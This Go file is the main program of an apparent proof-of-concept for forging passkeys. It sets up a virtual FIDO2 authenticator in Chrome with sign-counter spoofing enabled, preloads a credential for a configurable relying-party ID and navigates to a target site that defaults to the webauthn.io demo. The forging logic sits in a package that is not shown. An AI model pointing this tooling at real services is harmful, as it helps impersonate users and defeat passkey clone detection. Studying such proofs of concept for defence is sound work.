package main

import (
	"flag"
	"forging-passkeys-poc/pkg/browser"
	"log"
	"os"
	"os/signal"
	"syscall"
	"time"
)

func main() {
	rpid := flag.String("rpid", "webauthn.io", "the rpid to use for the credential")
	headless := flag.Bool("headless", false, "run chrome in headless mode")
	targetURL := flag.String("url", "https://webauthn.io", "the target url to navigate to")
	flag.Parse()

	log.Printf("[+] forging passkeys - virtual fido2 authenticator")
	log.Printf("[+] target: %s (%s)", *targetURL, *rpid)
	log.Printf("[+] sign counter spoofing: enabled")

	log.Printf("[+] creating virtual authenticator...")
	auth, err := browser.New(*headless)
	if err != nil {
		log.Fatalf("[-] failed to create virtual authenticator: %v", err)
	}
	defer auth.Close()

	log.Printf("[+] preloading credential for %s...", *rpid)
	if err := auth.PreloadCredential(*rpid); err != nil {
		log.Fatalf("[-] failed to preload credential: %v", err)
	}

	log.Printf("[+] navigating to %s...", *targetURL)
	if err := auth.Navigate(*targetURL); err != nil {
		log.Fatalf("[-] failed to navigate: %v", err)
	}

	log.Printf("[+] virtual authenticator ready!")
	log.Printf("[+] try registering or authenticating with a passkey on the website")
	log.Printf("[+] press Ctrl+C to exit")


	sig := make(chan os.Signal, 1)
	signal.Notify(sig, syscall.SIGINT, syscall.SIGTERM)
	

	timeout := time.NewTimer(5 * time.Minute)
	defer timeout.Stop()

	select {
	case <-sig:
		log.Printf("[+] shutting down...")
	case <-timeout.C:
		log.Printf("[+] demo timeout reached, shutting down...")
	}
} 